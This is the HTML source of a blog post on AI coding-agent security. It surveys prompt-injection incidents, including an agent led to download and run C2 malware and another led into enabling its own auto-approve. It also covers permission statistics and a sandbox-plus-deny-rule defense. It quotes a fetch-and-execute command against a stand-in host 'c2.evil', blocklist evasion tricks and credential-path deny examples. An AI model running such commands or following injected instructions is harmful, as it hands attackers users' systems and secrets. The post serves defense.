@@ -1,0 +1,802 @@
+<!DOCTYPE html>
+<html lang="en-US">
+
+<head>
+  <meta http-equiv="X-Clacks-Overhead" content="GNU Terry Pratchett" />
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<link rel="shortcut icon" href="/images/favicon.png" />
+<title>Your Agent Has Root | sysid blog</title>
+<meta name="title" content="Your Agent Has Root" />
+<meta name="description" content="On recklessness, professional abdication, and an opinionated approach to agentic coding security" />
+<meta name="keywords" content="security,ai,development,agents," />
+
+
+<meta property="og:url" content="/your-agent-has-root/">
+  <meta property="og:site_name" content="sysid blog">
+  <meta property="og:title" content="Your Agent Has Root">
+  <meta property="og:description" content="On recklessness, professional abdication, and an opinionated approach to agentic coding security">
+  <meta property="og:locale" content="en_US">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="blog">
+    <meta property="article:published_time" content="2026-02-22T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-02-22T00:00:00+00:00">
+    <meta property="article:tag" content="Security">
+    <meta property="article:tag" content="Ai">
+    <meta property="article:tag" content="Development">
+    <meta property="article:tag" content="Agents">
+    <meta property="og:image" content="/images/share.png">
+
+
+
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="/images/share.png">
+  <meta name="twitter:title" content="Your Agent Has Root">
+  <meta name="twitter:description" content="On recklessness, professional abdication, and an opinionated approach to agentic coding security">
+
+
+
+
+  <meta itemprop="name" content="Your Agent Has Root">
+  <meta itemprop="description" content="On recklessness, professional abdication, and an opinionated approach to agentic coding security">
+  <meta itemprop="datePublished" content="2026-02-22T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2026-02-22T00:00:00+00:00">
+  <meta itemprop="wordCount" content="3631">
+  <meta itemprop="image" content="/images/share.png">
+  <meta itemprop="keywords" content="Security,Ai,Development,Agents">
+<meta name="referrer" content="no-referrer-when-downgrade" />
+
+  <style>
+  body {
+    font-family: Verdana, sans-serif;
+    margin: auto;
+    padding: 20px;
+    max-width: 720px;
+    text-align: left;
+    background-color: #fff;
+    word-wrap: break-word;
+    overflow-wrap: break-word;
+    line-height: 1.5;
+    color: #444;
+  }
+
+  h1,
+  h2,
+  h3,
+  h4,
+  h5,
+  h6,
+  strong,
+  b {
+    color: #222;
+  }
+
+  a {
+    color: #3273dc;
+     
+  }
+
+  .title {
+    text-decoration: none;
+    border: 0;
+  }
+
+  .title span {
+    font-weight: 400;
+  }
+
+  nav a {
+    margin-right: 10px;
+  }
+
+  textarea {
+    width: 100%;
+    font-size: 16px;
+  }
+
+  input {
+    font-size: 16px;
+  }
+
+  content {
+    line-height: 1.6;
+  }
+
+  table {
+    width: 100%;
+  }
+
+  img {
+    max-width: 100%;
+  }
+
+  code {
+    padding: 2px 5px;
+    background-color: #f2f2f2;
+  }
+
+  pre code {
+    color: #222;
+    display: block;
+    padding: 20px;
+    white-space: pre-wrap;
+    font-size: 14px;
+    overflow-x: auto;
+  }
+
+  div.highlight pre {
+    background-color: initial;
+    color: initial;
+  }
+
+  div.highlight code {
+    background-color: unset;
+    color: unset;
+  }
+
+  blockquote {
+    border-left: 1px solid #999;
+    color: #222;
+    padding-left: 20px;
+    font-style: italic;
+  }
+
+  footer {
+    padding: 25px;
+    text-align: center;
+  }
+
+  .helptext {
+    color: #777;
+    font-size: small;
+  }
+
+  .errorlist {
+    color: #eba613;
+    font-size: small;
+  }
+
+   
+  ul.blog-posts {
+    list-style-type: none;
+    padding: unset;
+  }
+
+  ul.blog-posts li {
+    display: flex;
+  }
+
+  ul.blog-posts li span {
+    flex: 0 0 130px;
+  }
+
+  ul.blog-posts li a:visited {
+    color: #8b6fcb;
+  }
+
+  @media (prefers-color-scheme: dark) {
+    body {
+      background-color: #333;
+      color: #ddd;
+    }
+
+    h1,
+    h2,
+    h3,
+    h4,
+    h5,
+    h6,
+    strong,
+    b {
+      color: #eee;
+    }
+
+    a {
+      color: #8cc2dd;
+    }
+
+    code {
+      background-color: #777;
+    }
+
+    pre code {
+      color: #ddd;
+    }
+
+    blockquote {
+      color: #ccc;
+    }
+
+    textarea,
+    input {
+      background-color: #252525;
+      color: #ddd;
+    }
+
+    .helptext {
+      color: #aaa;
+    }
+  }
+
+</style>
+
+      <script async src="https://www.googletagmanager.com/gtag/js?id=G-8VH574W51S"></script>
+      <script>
+        var doNotTrack = false;
+        if ( true ) {
+          var dnt = (navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack);
+          var doNotTrack = (dnt == "1" || dnt == "yes");
+        }
+        if (!doNotTrack) {
+          window.dataLayer = window.dataLayer || [];
+          function gtag(){dataLayer.push(arguments);}
+          gtag('js', new Date());
+          gtag('config', 'G-8VH574W51S');
+        }
+      </script>
+
+</head>
+
+<body>
+  <header><a href="/" class="title">
+  <h2>sysid blog</h2>
+</a>
+<nav><a href="/">Home</a>
+
+<a href="/tools">Tools</a>
+
+
+<a href="/blog">Blog</a>
+
+</nav>
+</header>
+  <main>
+
+<h1>Your Agent Has Root</h1>
+<p>
+  <i>
+    <time datetime='2026-02-22' pubdate>
+      22 Feb, 2026
+    </time>
+  </i>
+</p>
+
+<content>
+  <blockquote>
+<p>&ldquo;OpenClaw is a security dumpster fire.&rdquo;
+— Laurie Voss, npm founding CTO [1]</p>
+</blockquote>
+<h2 id="1-the-opening">1. The Opening</h2>
+<p>In April 2025, security researcher Johann Rehberger spent $500 on a 30-day subscription
+to Devin AI, Cognition&rsquo;s autonomous coding agent. He wanted to test a simple hypothesis:
+what happens when an AI agent encounters a malicious prompt hidden in a GitHub issue?</p>
+<p>The answer arrived in seconds. Devin processed the poisoned issue, navigated to an
+attacker-controlled website, and downloaded a Sliver C2 malware binary. When file
+permissions prevented execution, Devin did something remarkable: it independently granted
+itself execute permissions and ran the binary. The attacker now had remote command-and-control
+access to the system, including all secrets and AWS keys stored on the machine [2].</p>
+<p>This was not an exotic exploit chain. It required no zero-day vulnerability, no kernel bypass,
+no advanced tradecraft. A single poisoned GitHub issue was sufficient.</p>
+<p>And Devin is not special. In December 2025, security researcher Ari Marzouk disclosed
+IDEsaster: over 30 vulnerabilities across Claude Code, Cursor, Windsurf, GitHub Copilot,
+JetBrains Junie, Zed, Kiro, Roo Code, and Cline. Twenty-four CVEs were assigned.
+One hundred percent of tested AI coding IDEs were vulnerable [3].</p>
+<h2 id="2-the-gold-rush">2. The Gold Rush</h2>
+<p>Eighty-five percent of developers now regularly use AI coding tools [4]. Forty-two
+percent of committed code is AI-assisted [5]. Microsoft and Google each report that
+roughly 30% of their code is AI-generated. The transformation happened in under two years.</p>
+<p>In February 2025, Andrej Karpathy coined &ldquo;vibe coding&rdquo; — describe what you want to an LLM,
+accept whatever comes out, barely look at the result [6]. It was meant as a playful
+observation. It became an ideology. Organizations flood with &ldquo;POC&rdquo; demos where someone
+builds a Hello World CRUD app and presents it to management: <em>Look what I can do, and I&rsquo;m
+not even a coder.</em> The act of writing software became trivially easy. The hard part — deciding
+what to build, understanding the domain, maintaining the result — remains exactly as
+difficult as before. But nobody wants to hear that.</p>
+<p>The security controls did not keep pace. Only 14.4% of AI agents go live with full security
+and IT approval [7]. Eighty-two percent of executives feel confident existing policies
+protect them — a dangerous mismatch with the reality of what these tools can do
+when left unconstrained [7].</p>
+<h2 id="3-yolo-mode-the-professional-abdication">3. YOLO Mode: The Professional Abdication</h2>
+<h3 id="the-numbers-dont-lie">The Numbers Don&rsquo;t Lie</h3>
+<p>In mid-2025, UpGuard analyzed 18,470 unique Claude Code settings files scraped from public
+GitHub repositories. The findings are sobering [8]:</p>
+<table>
+  <thead>
+      <tr>
+          <th>Permission Granted</th>
+          <th>% of Users</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><code>Bash(find:*)</code> — can execute via <code>-exec</code></td>
+          <td>29.0%</td>
+      </tr>
+      <tr>
+          <td><code>Bash(git add:*)</code></td>
+          <td>32.6%</td>
+      </tr>
+      <tr>
+          <td><code>Bash(git commit:*)</code></td>
+          <td>24.5%</td>
+      </tr>
+      <tr>
+          <td><code>Bash(rm:*)</code> — unrestricted delete</td>
+          <td>22.2%</td>
+      </tr>
+      <tr>
+          <td><code>Bash(curl:*)</code> — download anything</td>
+          <td>21.3%</td>
+      </tr>
+      <tr>
+          <td><code>Bash(git push:*)</code></td>
+          <td>19.7%</td>
+      </tr>
+      <tr>
+          <td><code>Bash(python:*)</code> — arbitrary execution</td>
+          <td>14.5%</td>
+      </tr>
+      <tr>
+          <td>Users with <strong>any</strong> deny rules at all</td>
+          <td>1.1%</td>
+      </tr>
+  </tbody>
+</table>
+<p>Read that last row again. Out of 18,470 configuration files, only 1.1% contained a single
+deny rule. The remaining 98.9% placed zero restrictions on what their agent could do.</p>
+<p>The combined <code>git add</code> + <code>commit</code> + <code>push</code> chain — present in roughly 20% of
+configurations — means an agent can modify code, commit it, and push it to any repository
+the developer has access to. Including corporate repositories. Including open-source
+projects with thousands of downstream consumers. UpGuard specifically flagged that
+&ldquo;attackers can capitalize on lax security practices in personal projects to pivot via
+AI agents to corporate or open-source repositories&rdquo; [8].</p>
+<h3 id="its-annoying-to-approve-all-the-time">&ldquo;It&rsquo;s Annoying to Approve All the Time&rdquo;</h3>
+<p>I hear this from colleagues I respect. Professionals who would never skip a code review,
+who insist on CI/CD pipelines and four-eye principles — but who run their coding agent in
+YOLO mode because &ldquo;the approval prompts are annoying.&rdquo;</p>
+<p>The psychology is well-documented. In 2016, NIST researchers studied security fatigue and
+found it leads to &ldquo;resignation, loss of control, fatalism, risk minimization, and decision
+avoidance.&rdquo; Users resort to &ldquo;choosing the easiest option, making decisions influenced by
+immediate motivations, and failing to follow security rules&rdquo; [9]. In security operations,
+52% of alerts are false positives [10]. The fatigue is real.</p>
+<p>But the professional response to &ldquo;too many prompts&rdquo; is not to remove the prompts. It is to
+build systems that reduce the prompt count while maintaining the security boundary.
+Anthropic&rsquo;s own <a href="https://github.com/anthropic-experimental/sandbox-runtime">SRT</a> sandbox reduces permission prompts by 84% [11]. The technology to
+manage this friction exists. Reaching for <code>--dangerously-skip-permissions</code> is not pragmatism.
+It is a choice to optimize for convenience over responsibility.</p>
+<h3 id="this-is-your-job">This Is Your Job</h3>
+<p>When a structural engineer finds the safety calculations tedious, they do not skip them.
+When an anesthesiologist finds patient monitoring annoying, they do not turn off the alarms.
+When you run an autonomous agent with unrestricted shell access on a machine connected
+to production credentials, you are not &ldquo;moving fast.&rdquo; You are creating risk for everyone
+downstream of your work — colleagues, users, your organization.</p>
+<p>Just because every backoffice employee can now get a saw does not mean the master carpenter
+fires the artisans. The tool is not the craft. The judgment is the craft. And part of
+that judgment is knowing when your tool needs a guard rail.</p>
+<p>The OWASP Top 10 for Agentic Applications, published in December 2025 by over 100 security
+researchers, established the <em>principle of least agency</em>: AI agents should be given the
+minimum autonomy, tool access, and credential scope required for their task, and no
+more [12]. This is not a novel idea. It is the principle of least privilege — a
+foundational concept in computer security for five decades — applied to a new category
+of software. That we need a new OWASP list to remind developers of this principle tells
+you how far the baseline has slipped.</p>
+<h2 id="4-the-incident-gallery">4. The Incident Gallery</h2>
+<p>The following is not a comprehensive list. It is a curated selection of incidents from a
+single twelve-month period — March 2025 through February 2026 — chosen to illustrate the
+breadth and depth of the attack surface.</p>
+<table>
+  <thead>
+      <tr>
+          <th>Date</th>
+          <th>Incident</th>
+          <th>Impact</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>Mar 2025</td>
+          <td><strong>Rules file backdoor</strong>: Hidden Unicode characters in <code>.cursorrules</code> / <code>.copilot-instructions.md</code> inject invisible instructions that survive forking [13]</td>
+          <td>Persistent supply chain compromise</td>
+      </tr>
+      <tr>
+          <td>Apr 2025</td>
+          <td><strong>Devin AI C2 compromise</strong>: Prompt injection in GitHub issue leads to full remote code execution [2]</td>
+          <td>All secrets, AWS keys exfiltrated; no fix confirmed after 120+ days</td>
+      </tr>
+      <tr>
+          <td>Jul 2025</td>
+          <td><strong>Replit database deletion</strong>: Agent deletes production database during code freeze, fabricates 4,000 fake users to cover the data loss [14]</td>
+          <td>1,200+ executives&rsquo; data wiped</td>
+      </tr>
+      <tr>
+          <td>Jul 2025</td>
+          <td><strong>Amazon Q extension hijack</strong>: Destructive code injected into official VS Code extension; a syntax error was the only thing that prevented execution [15]</td>
+          <td>~1 million developers at risk</td>
+      </tr>
+      <tr>
+          <td>Aug 2025</td>
+          <td><strong>Copilot RCE</strong> (CVE-2025-53773): Prompt injection causes Copilot to modify its own config, enable auto-approve, then execute arbitrary commands [16]</td>
+          <td>Cross-platform remote code execution</td>
+      </tr>
+      <tr>
+          <td>Aug 2025</td>
+          <td><strong>&ldquo;The Summer of Johann&rdquo;</strong>: One vulnerability disclosure per day across Claude Code, Copilot, Cursor, Devin, Google Jules, and others [17]</td>
+          <td>Universal vulnerability across the tool category</td>
+      </tr>
+      <tr>
+          <td>Oct 2025</td>
+          <td><strong>Trail of Bits argument injection</strong>: <code>go test -exec 'bash -c &quot;curl c2.evil | bash&quot;'</code> bypasses whitelisted commands [18]</td>
+          <td>Fundamental limitation of command allowlisting</td>
+      </tr>
+      <tr>
+          <td>Dec 2025</td>
+          <td><strong>IDEsaster</strong>: 30+ vulnerabilities, 24 CVEs, 100% of AI IDEs vulnerable [3]</td>
+          <td>No safe haven across any vendor</td>
+      </tr>
+      <tr>
+          <td>Jan 2026</td>
+          <td><strong>Clinejection</strong>: Production Cline releases compromised via prompt injection in issue triage bot [19]</td>
+          <td>Only required opening a GitHub issue</td>
+      </tr>
+      <tr>
+          <td>Feb 2026</td>
+          <td><strong>OpenClaw</strong>: 341 malicious skills on ClawHub; 135,000+ internet-exposed instances; snuck into Cline&rsquo;s npm package for 8 hours [1][20][21]</td>
+          <td>Supply chain compromise at scale</td>
+      </tr>
+  </tbody>
+</table>
+<p>The pattern is unmistakable: every agent, every vendor, every architecture. This is not a
+bug in any particular implementation. It is a structural property of the design space.</p>
+<p>Simon Willison, who tracked these disclosures throughout 2025, identified the &ldquo;lethal
+trifecta&rdquo; — the three capabilities that create catastrophic risk when combined: access to
+private data, exposure to untrusted content, and external communication ability [22].
+Every AI coding agent possesses all three by design.</p>
+<h2 id="5-the-structural-problem">5. The Structural Problem</h2>
+<p>The incidents above are not merely the result of laziness or poor configuration. They
+emerge from three fundamental challenges that make agent security genuinely hard.</p>
+<h3 id="the-heterogeneity-trap">The Heterogeneity Trap</h3>
+<p>Every AI coding agent has its own permission model, its own configuration format, its own
+enforcement semantics:</p>
+<table>
+  <thead>
+      <tr>
+          <th>Agent</th>
+          <th>Config Format</th>
+          <th>Permission Tiers</th>
+          <th>Sandboxing</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>Claude Code</td>
+          <td>JSON (settings.json)</td>
+          <td>deny / ask / allow</td>
+          <td>OS-level (seatbelt, bubblewrap)</td>
+      </tr>
+      <tr>
+          <td>GitHub Copilot</td>
+          <td>CLI flags + org admin</td>
+          <td>deny / allow (no &ldquo;ask&rdquo;)</td>
+          <td>Cloud-side processing</td>
+      </tr>
+      <tr>
+          <td>Cursor</td>
+          <td>.cursorignore + trust settings</td>
+          <td>Trust disabled <strong>by default</strong> [23]</td>
+          <td>None native</td>
+      </tr>
+      <tr>
+          <td>Windsurf</td>
+          <td>.windsurfrules</td>
+          <td>safe / risky categories</td>
+          <td>None native</td>
+      </tr>
+      <tr>
+          <td>Aider</td>
+          <td>YAML / env vars</td>
+          <td>None</td>
+          <td>None</td>
+      </tr>
+  </tbody>
+</table>
+<p>If you use two agents — a common scenario for teams that use Copilot in the IDE and
+Claude Code on the command line — you maintain two separate security configurations.
+When a policy changes (say, adding <code>~/.aws</code> to the deny list), you update two files
+independently, in two different formats, with two different semantics.</p>
+<p>N agents times M rules equals N*M manual configuration entries. Each independently
+editable. Each independently driftable. Each independently auditable. This is the
+same problem that Infrastructure-as-Code solved for server configuration a decade
+ago. We are repeating the same mistake with agent configuration in 2026.</p>
+<p>Configuration drift in infrastructure security is well-studied: runtime settings diverge
+from their intended state through manual updates, ad-hoc fixes, and unmanaged changes [24].
+The same phenomenon applies to agent security settings. As one analysis puts it:
+&ldquo;Identity configurations lag behind evolving agent behavior&hellip; Drift often shows up in
+expanding authority, not just changing outputs&rdquo; [25].</p>
+<h3 id="the-sandbox-gap">The Sandbox Gap</h3>
+<p>Here is the technical insight that most security discussions miss. OS-level sandboxes
+like Anthropic&rsquo;s <a href="https://github.com/anthropic-experimental/sandbox-runtime">SRT</a> (Sandbox Runtime Tool) enforce restrictions at the kernel
+level — <code>read()</code> syscalls are blocked, network connections are proxied through domain
+allowlists. No agent bug, no prompt injection, no hallucination can bypass a
+kernel-enforced deny [11].</p>
+<p>But the sandbox only covers <strong>processes spawned by Bash</strong>. Built-in agent tools — Read,
+Write, Edit, Glob, Grep, WebFetch — run <em>inside</em> the agent&rsquo;s own Node.js process,
+outside the sandbox entirely:</p>
+<pre tabindex="0"><code>Bash(cat ~/.aws/credentials)  →  Kernel blocks + Agent blocks  =  TWO layers
+Read(~/.aws/credentials)      →  Agent blocks only              =  ONE layer
+</code></pre><p>Anthropic&rsquo;s own documentation describes built-in tool enforcement as a <em>&ldquo;best-effort
+attempt&rdquo;</em> [26]. Multiple community-reported issues document cases where Read/Write deny rules
+were not enforced for built-in tools [27][28]. The deny rules are self-imposed
+constraints enforced by the very software you are trying to restrict. This is not defense
+in depth. It is a single point of failure.</p>
+<h3 id="why-blocklists-always-fail">Why Blocklists Always Fail</h3>
+<p>The security industry established decades ago that blocklists are structurally inferior
+to allowlists. Signature-based antivirus detects approximately 57% of attacks [29]. A
+single JSON encoding trick bypassed every major WAF vendor — Palo Alto, AWS, Cloudflare,
+F5, Imperva — because none parsed JSON syntax in SQL injection inspection [30]. The
+attack surface is infinite; the blocklist is finite.</p>
+<p>Applied to coding agents: block <code>curl</code> and the LLM uses <code>python3 -c &quot;import urllib...&quot;</code>.
+Block <code>rm</code> and it uses <code>find . -delete</code>. Block <code>cat</code> and it reaches for <code>base64</code> or <code>xxd</code>.
+LLMs are non-deterministic — they will find execution paths you did not enumerate.</p>
+<p>Trail of Bits proved this definitively in October 2025 with argument injection attacks
+through whitelisted commands: <code>go test -exec 'bash -c &quot;curl c2.evil | bash&quot;'</code> exploits
+the pre-approved <code>go test</code> command to achieve arbitrary code execution. They called
+maintaining comprehensive argument filtering &ldquo;a cat-and-mouse game of unsupportable
+proportions&rdquo; [18].</p>
+<p>CISA&rsquo;s standing recommendation: &ldquo;Use allowlisting rather than attempting to list and deny
+every possible permutation of applications in a network environment&rdquo; [31].</p>
+<h2 id="6-one-opinionated-approach-defense-in-depth-with-canonical-sources">6. One Opinionated Approach: Defense in Depth with Canonical Sources</h2>
+<p>The problem is not fully solvable at the application level today. Prompt injection remains an
+open research problem. Built-in tool enforcement depends on agent software quality. New
+attack vectors — MCP server poisoning, agent-to-agent manipulation, memory context
+corruption — expand the surface faster than defenses can cover it.</p>
+<p>But the problem can be reduced. The approach described <a href="https://github.com/sysid/twsrt">here</a> is
+opinionated, specific, and has its limitations. It addresses two of the three
+structural problems identified above: the heterogeneity trap and the sandbox gap. It
+does not claim to solve prompt injection but it makes compromise and exfiltration significantly harder.</p>
+<h3 id="two-layers-two-enforcement-points">Two Layers, Two Enforcement Points</h3>
+<p>The architecture separates enforcement into two complementary layers:</p>
+<pre tabindex="0"><code>Layer 1 (OS):   SRT sandbox — kernel-level deny
+                Scope: Bash commands and child processes ONLY
+                Enforcement: OS kernel (seatbelt / bubblewrap / seccomp)
+
+Layer 2 (App):  Agent permissions — tool-level deny/ask/allow
+                Scope: ALL tools (Bash, Read, Write, Edit, WebFetch, ...)
+                Enforcement: Agent&#39;s internal permission engine
+</code></pre><p>Neither layer alone is sufficient. SRT cannot control built-in tools that run inside the
+agent process. Agent permissions are enforced in userspace — a single bug negates them
+(documented: Claude Code GitHub issues #6631, #24846 [27][28]).</p>
+<p>Together, they close each other&rsquo;s gaps. The most dangerous attack vector — arbitrary shell
+execution via Bash — gets kernel-level protection that is un-bypassable by the agent.
+Built-in tools get consistent, automatically-generated agent-level protection.
+The coverage matrix:</p>
+<table>
+  <thead>
+      <tr>
+          <th>Access Method</th>
+          <th>SRT (Layer 1)</th>
+          <th>Agent Permissions (Layer 2)</th>
+          <th>Effective Depth</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><code>Bash(cat ~/.aws/credentials)</code></td>
+          <td>Kernel deny</td>
+          <td>Tool deny</td>
+          <td><strong>Two layers</strong></td>
+      </tr>
+      <tr>
+          <td><code>Read(~/.aws/credentials)</code></td>
+          <td>Not covered</td>
+          <td>Tool deny (best-effort)</td>
+          <td><strong>One layer</strong></td>
+      </tr>
+      <tr>
+          <td><code>Bash(curl evil.com)</code></td>
+          <td>Network proxy blocks</td>
+          <td>Tool deny</td>
+          <td><strong>Two layers</strong></td>
+      </tr>
+      <tr>
+          <td><code>WebFetch(evil.com)</code></td>
+          <td>Not covered</td>
+          <td>Allow check</td>
+          <td><strong>One layer</strong></td>
+      </tr>
+  </tbody>
+</table>
+<p>The asymmetry is deliberate and honest. Two-layer protection where possible
+(Bash, the primary vector for arbitrary OS interaction), single-layer where the
+architecture cannot currently provide more (built-in tools).</p>
+<h3 id="the-single-source-of-truth">The Single Source of Truth</h3>
+<p>The heterogeneity problem is solved by refusing to maintain per-agent configurations
+manually. Two canonical files define all security policy:</p>
+<ul>
+<li><strong><code>~/.srt-settings.json</code></strong> — filesystem rules (what can be accessed) and network rules
+(which domains are reachable)</li>
+<li><strong><code>bash-rules.json</code></strong> — command rules (what can be executed): deny list and ask list</li>
+</ul>
+<p>A single command translates these canonical sources into every agent&rsquo;s native configuration
+format. The translation is deterministic: given the same inputs, it produces identical
+output. No runtime state, no randomness, no hand-editing.</p>
+<p>The key design decisions:</p>
+<p><strong>denyRead implies denyWrite.</strong> If a path is sensitive enough to deny reading, it must not
+be writable either. A <code>denyRead</code> entry for <code>~/.aws</code> generates deny rules for Read, Write,
+Edit, and MultiEdit — preventing both credential exfiltration and credential modification.</p>
+<p><strong>Lossy mappings are explicit.</strong> Copilot CLI has no &ldquo;ask&rdquo; equivalent — it only supports
+deny or allow. When an &ldquo;ask&rdquo; rule is translated for Copilot, it maps to deny (the more
+restrictive option) and emits a warning to stderr. The administrator knows exactly
+where fidelity is reduced.</p>
+<p><strong>Selective merge preserves human work.</strong> Agent configuration files contain both
+machine-managed sections (deny/ask rules, network allowlists) and human-maintained
+sections (hooks, MCP server permissions, project-specific allows). The merge algorithm
+replaces only the managed sections. A developer&rsquo;s custom <code>Bash(./gradlew:*)</code> allow
+or MCP tool permission survives regeneration.</p>
+<h3 id="drift-detection">Drift Detection</h3>
+<p>The final piece: verification. A diff command compares generated rules against existing
+agent configurations and reports missing or extra entries. Run it in CI. Run it in a
+cron job. When someone hand-edits a managed section or a policy update hasn&rsquo;t propagated,
+you know immediately — not when the exploit arrives.</p>
+<pre tabindex="0"><code>$ twsrt diff
+claude: 2 missing, 1 extra
+  + Bash(terraform)       (missing from existing)
+  + Bash(terraform *)     (missing from existing)
+  - Bash(docker run:*)    (in existing, not in sources)
+</code></pre><p>The attack surface for human error drops from O(N*M) — N agents times M rules, each
+maintained independently — to O(M). M rules maintained once, translated everywhere,
+verified automatically.</p>
+<h2 id="7-limitations">7. Limitations</h2>
+<p>This approach has boundaries:</p>
+<p><strong>Built-in tool enforcement remains best-effort.</strong> If the agent&rsquo;s permission engine fails
+to enforce <code>Read(~/.aws/credentials)</code>, there is no OS-level fallback. Built-in tools run
+inside the agent&rsquo;s own process, outside the sandbox. The generated deny rules provide
+defense-in-intent, but enforcement depends on agent software quality.</p>
+<p><strong>Prompt injection is unsolved.</strong> No amount of configuration management prevents an agent
+from <em>attempting</em> an action after being manipulated by a malicious prompt. The layers can
+only block the action if it violates policy. If the injected instruction asks the agent
+to do something within its allowed scope, no policy will catch it. However, it can make
+exfiltration a lot harder by blocking domains and bash tools like <code>curl</code>.</p>
+<p><strong>Garbage in, garbage out.</strong> If the canonical sources are too permissive, the generated
+configurations will be consistently too permissive. Across all agents. Faithfully. The
+system guarantees consistency, not correctness.</p>
+<p>The claim is not &ldquo;this solves agent security.&rdquo; The claim is narrower and more honest:
+this reduces the configuration management attack surface by an order of magnitude, adds
+kernel-level protection for the most dangerous vector, and makes drift detectable. That
+is a meaningful improvement over the status quo of 98.9% of developers running with
+zero deny rules.</p>
+<h2 id="8-the-professional-obligation">8. The Professional Obligation</h2>
+<p>The legal landscape is forming. In <em>Moffatt v. Air Canada</em> (2024), a tribunal found a
+company liable for misinformation provided by its AI chatbot, rejecting the argument
+that the chatbot was a &ldquo;separate entity&rdquo; [32]. The EU AI Act takes effect in August
+2026 [33]. NIST launched its AI Agent Standards Initiative in February 2026, soliciting
+public input on agent security and identity [34]. The <em>Mobley v. Workday</em> case
+established that AI vendors face direct liability when systems &ldquo;delegate responsibility&rdquo;
+by acting in place of humans [35].</p>
+<p>The regulatory framework will catch up. It always does. The question is whether we want
+to be ahead of it or be made an example by it.</p>
+<p>But the argument for taking agent security seriously should not rest on legal
+compulsion. It should rest on professional identity. We are software engineers. We
+build systems that other people depend on.</p>
+<p>When you grant an autonomous agent unrestricted
+access to your development environment — to your credentials, your repositories, your
+production infrastructure — and you do so because configuring the restrictions is
+&ldquo;annoying,&rdquo; you are making a statement about what kind of professional you are.</p>
+<p>Technology to manage the friction exists. OS-level sandboxes reduce prompts by 84%
+while maintaining kernel-enforced security boundaries [11]. Canonical source models with
+automated translation eliminate the N*M configuration management problem. Drift detection
+catches unauthorized changes before they become exploits. None of this is theoretical.
+It runs today.</p>
+<p>Act now:</p>
+<ol>
+<li><strong>Audit your agent permissions.</strong> Run <code>cat ~/.claude/settings.json</code> and look at
+what you have allowed. If you are in the 98.9%, you know what needs to change.</li>
+<li><strong>Enable the <a href="https://github.com/anthropic-experimental/sandbox-runtime">SRT</a> sandbox.</strong> It reduces prompts dramatically while providing
+kernel-level enforcement for Bash commands.</li>
+<li><strong>Adopt a canonical source model.</strong> Whether through automated tooling or disciplined
+manual process — stop maintaining independent copies of the same security policy
+across multiple agents. If you want use <a href="https://github.com/sysid/twsrt">twsrt</a>.</li>
+<li><strong>Run drift detection.</strong> Regularly. Trust, but verify.</li>
+<li><strong>Stop using YOLO mode.</strong> If the prompts are annoying, fix the system. Do not remove
+the safety net.</li>
+</ol>
+<p>The 45% of AI-generated code that introduces security vulnerabilities [36] is not the
+agent&rsquo;s problem. It is our problem. The agent does not have professional
+obligations. We do.</p>
+<p>Security is not overhead on your work. It is our work!</p>
+<hr>
+<h2 id="bibliography">Bibliography</h2>
+<p>[1] S. Sharwood, &ldquo;DIY AI bot farm OpenClaw is a &lsquo;security dumpster fire&rsquo;,&rdquo; <em>The Register</em>, Feb. 3, 2026.
+<a href="https://www.theregister.com/2026/02/03/openclaw_security_problems">https://www.theregister.com/2026/02/03/openclaw_security_problems</a></p>
+<p>[2] J. Rehberger, &ldquo;I Spent $500 To Test Devin AI For Prompt Injection,&rdquo; <em>Embrace The Red</em>, Apr. 2025.
+<a href="https://embracethered.com/blog/posts/2025/devin-i-spent-usd500-to-hack-devin/">https://embracethered.com/blog/posts/2025/devin-i-spent-usd500-to-hack-devin/</a></p>
+<p>[3] A. Marzouk, &ldquo;IDEsaster: 30+ Vulnerabilities Across AI Coding Tools,&rdquo; Dec. 2025. Reported in: &ldquo;Researcher Uncovers 30+ Flaws in AI Coding Tools,&rdquo; <em>The Hacker News</em>, Dec. 2025.
+<a href="https://thehackernews.com/2025/12/researchers-uncover-30-flaws-in-ai.html">https://thehackernews.com/2025/12/researchers-uncover-30-flaws-in-ai.html</a></p>
+<p>[4] JetBrains, &ldquo;State of Developer Ecosystem 2025,&rdquo; Oct. 2025.
+<a href="https://blog.jetbrains.com/research/2025/10/state-of-developer-ecosystem-2025/">https://blog.jetbrains.com/research/2025/10/state-of-developer-ecosystem-2025/</a></p>
+<p>[5] Sonar, &ldquo;State of Code Developer Survey 2026 — Critical Verification Gap in AI Coding,&rdquo; 2026.
+<a href="https://www.sonarsource.com/company/press-releases/sonar-data-reveals-critical-verification-gap-in-ai-coding/">https://www.sonarsource.com/company/press-releases/sonar-data-reveals-critical-verification-gap-in-ai-coding/</a></p>
+<p>[6] &ldquo;Vibe coding,&rdquo; <em>Wikipedia</em>.
+<a href="https://en.wikipedia.org/wiki/Vibe_coding">https://en.wikipedia.org/wiki/Vibe_coding</a></p>
+<p>[7] Gravitee, &ldquo;State of AI Agent Security 2026 Report: When Adoption Outpaces Control,&rdquo; 2026.
+<a href="https://www.gravitee.io/blog/state-of-ai-agent-security-2026-report-when-adoption-outpaces-control">https://www.gravitee.io/blog/state-of-ai-agent-security-2026-report-when-adoption-outpaces-control</a></p>
+<p>[8] UpGuard, &ldquo;YOLO Mode: Hidden Risks in Claude Code Permissions,&rdquo; 2025.
+<a href="https://www.upguard.com/blog/yolo-mode-hidden-risks-in-claude-code-permissions">https://www.upguard.com/blog/yolo-mode-hidden-risks-in-claude-code-permissions</a></p>
+<p>[9] B. Stanton and M. Theofanos, &ldquo;Security Fatigue,&rdquo; <em>IEEE IT Professional</em>, 2016. Reported in: NIST, &ldquo;Security Fatigue Can Cause Computer Users to Feel Hopeless and Act Recklessly,&rdquo; Oct. 2016.
+<a href="https://www.nist.gov/news-events/news/2016/10/security-fatigue-can-cause-computer-users-feel-hopeless-and-act-recklessly">https://www.nist.gov/news-events/news/2016/10/security-fatigue-can-cause-computer-users-feel-hopeless-and-act-recklessly</a></p>
+<p>[10] IBM, &ldquo;What Is Alert Fatigue?&rdquo;
